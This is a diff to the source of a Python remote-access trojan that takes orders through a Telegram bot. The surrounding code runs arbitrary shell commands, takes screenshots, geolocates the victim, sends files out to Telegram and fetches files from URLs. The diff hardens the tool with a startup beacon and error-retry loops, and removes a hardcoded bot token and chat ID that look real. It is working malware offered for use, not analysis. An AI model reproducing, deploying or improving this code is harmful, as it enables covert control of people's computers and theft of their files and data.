@@ -13,9 +13,10 @@ except ImportError:
         os.system("python3 -m pip install pillow -q -q -q")
         from PIL import ImageGrab
 
-TOKEN = '7864116035:AAFbw8Gvl-SSUrS-HDPcbwpDk7QDakKL2lQ'   #change the token here
-CHAT_ID = '6771574834'   #change the chat id here
+TOKEN = ''  # Change the token here
+CHAT_ID = ''  # Change the chat id here
 processed_message_ids = []
+
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
     params = {'offset': offset, 'timeout': 60}
@@ -27,14 +28,13 @@ def get_updates(offset=None):
         print(f"Failed to get updates. Status code: {response.status_code}")
         return []
 
-
 def delete_message(message_id):
     url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
     params = {'chat_id': CHAT_ID, 'message_id': message_id}
     response = requests.get(url, params=params)
     if response.status_code != 200:
-        print(f"Failed to delete message. Status code:")
-#coded by machine1337
+        print(f"Failed to delete message. Status code: {response.status_code}")
+
 def execute_command(command):
     if command == 'cd ..':
         os.chdir('..')
@@ -58,7 +58,7 @@ def execute_command(command):
             final = f"Country: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
             return final
         except Exception as e:
-            return 'Some shit occured'
+            return 'Some shit occurred'
     elif command == 'info':
         system_info = {
             'Platform': platform.platform(),
@@ -97,8 +97,7 @@ location            | Get Target Location
 get url             | Download File From URL (provide direct link)
             '''
     elif command.startswith('download '):
-        filename = command[
-                   9:].strip()
+        filename = command[9:].strip()
         if os.path.isfile(filename):
             send_file(filename)
             return f"File '{filename}' sent to Telegram."
@@ -133,7 +132,6 @@ get url             | Download File From URL (provide direct link)
         except subprocess.CalledProcessError as e:
             return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"
 
-
 def send_file(filename):
     url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
     with open(filename, 'rb') as file:
@@ -141,7 +139,7 @@ def send_file(filename):
         data = {'chat_id': CHAT_ID}
         response = requests.post(url, data=data, files=files)
         if response.status_code != 200:
-            print(f"Failed to send file.")
+            print(f"Failed to send file. Status code: {response.status_code}")
 
 def handle_updates(updates):
     highest_update_id = 0
@@ -160,6 +158,7 @@ def handle_updates(updates):
         if update_id > highest_update_id:
             highest_update_id = update_id
     return highest_update_id
+
 def send_message(text):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     params = {
@@ -168,17 +167,32 @@ def send_message(text):
     }
     response = requests.get(url, params=params)
     if response.status_code != 200:
-        print(f"Failed to send message.")
+        print(f"Failed to send message. Status code: {response.status_code}")
+
 def main():
+    # Send startup message
+    try:
+        send_message("Комп Запущен")
+        print("Startup message sent: Комп Запущен")
+    except Exception as e:
+        print(f"Failed to send startup message: {str(e)}")
+
+    # Main loop for processing updates
     offset = None
     while True:
-        updates = get_updates(offset)
-        if updates:
-            offset = handle_updates(updates) + 1
-            processed_message_ids.clear()
-        else:
-            print("No updates found.")
-        time.sleep(1)
+        try:
+            updates = get_updates(offset)
+            if updates:
+                offset = handle_updates(updates) + 1
+                processed_message_ids.clear()
+            else:
+                print("No updates found.")
+            time.sleep(1)
+        except Exception as e:
+            print(f"Error in main loop: {str(e)}")
+            time.sleep(5)  # Wait before retrying
+
 if __name__ == '__main__':
     main()
-#coded by machine1337. Don't copy this code
+
+# Coded by machine1337. Don't copy this code
